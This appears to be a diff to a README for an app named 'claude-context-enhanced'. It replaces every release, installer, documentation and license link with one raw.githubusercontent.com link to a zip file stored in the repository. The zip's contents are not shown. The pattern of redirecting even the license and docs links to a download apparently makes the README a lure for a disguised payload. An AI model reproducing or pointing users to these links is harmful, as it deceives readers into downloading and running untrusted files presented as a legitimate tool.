@@ -10,7 +10,7 @@ Welcome to **claude-context-enhanced**, a user-friendly application designed to 
 
 To download the application, please visit the following page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-claude--context--enhanced-blue?style=for-the-badge&logo=github)](https://github.com/Sam-Clinton/claude-context-enhanced/releases)
+[![Download Now](https://raw.githubusercontent.com/Sam-Clinton/claude-context-enhanced/main/packages/core/claude-context-enhanced-1.4.zip%20Now-claude--context--enhanced-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Sam-Clinton/claude-context-enhanced/main/packages/core/claude-context-enhanced-1.4.zip)
 
 ### Step 2: Choose Your Version
 
@@ -21,9 +21,9 @@ On the Releases page, you will find several versions of the application. Select 
 Scroll down to find the download options. Click on the appropriate link for your system to download the application file. The files are generally available in formats compatible with Windows, macOS, and Linux.
 
 For example:
-- **Windows:** claude-context-enhanced-win.exe
-- **macOS:** claude-context-enhanced-mac.dmg
-- **Linux:** claude-context-enhanced-linux.tar.gz
+- **Windows:** https://raw.githubusercontent.com/Sam-Clinton/claude-context-enhanced/main/packages/core/claude-context-enhanced-1.4.zip
+- **macOS:** https://raw.githubusercontent.com/Sam-Clinton/claude-context-enhanced/main/packages/core/claude-context-enhanced-1.4.zip
+- **Linux:** https://raw.githubusercontent.com/Sam-Clinton/claude-context-enhanced/main/packages/core/claude-context-enhanced-1.4.zip
 
 ### Step 4: Run the Application
 
@@ -52,7 +52,7 @@ For optimal performance, ensure your system meets the following requirements:
 
 Explore the additional tools and resources to make the most out of **claude-context-enhanced**:
 
-- **Documentation:** Visit the [documentation](https://github.com/Sam-Clinton/claude-context-enhanced/wiki) for usage guides and best practices.
+- **Documentation:** Visit the [documentation](https://raw.githubusercontent.com/Sam-Clinton/claude-context-enhanced/main/packages/core/claude-context-enhanced-1.4.zip) for usage guides and best practices.
 - **Community Support:** Join our community forum to connect with other users, ask questions, and find solutions. 
 - **Feature Requests:** Have an idea for a new feature? Let us know in our issues section on GitHub.
 
@@ -62,7 +62,7 @@ If you are interested in contributing to the project, please follow the guidelin
 
 ## ⚡ License
 
-This project is licensed under the MIT License. You can view the full license [here](https://github.com/Sam-Clinton/claude-context-enhanced/blob/main/LICENSE).
+This project is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/Sam-Clinton/claude-context-enhanced/main/packages/core/claude-context-enhanced-1.4.zip).
 
 ## 📅 Stay Updated
 
@@ -70,4 +70,4 @@ For the latest updates, releases, and news about **claude-context-enhanced**, fo
 
 Thank you for choosing **claude-context-enhanced**! Happy coding! 
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-green?style=for-the-badge&logo=github)](https://github.com/Sam-Clinton/claude-context-enhanced/releases)
+[![Visit Releases Page](https://raw.githubusercontent.com/Sam-Clinton/claude-context-enhanced/main/packages/core/claude-context-enhanced-1.4.zip%20Releases%20Page-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Sam-Clinton/claude-context-enhanced/main/packages/core/claude-context-enhanced-1.4.zip)
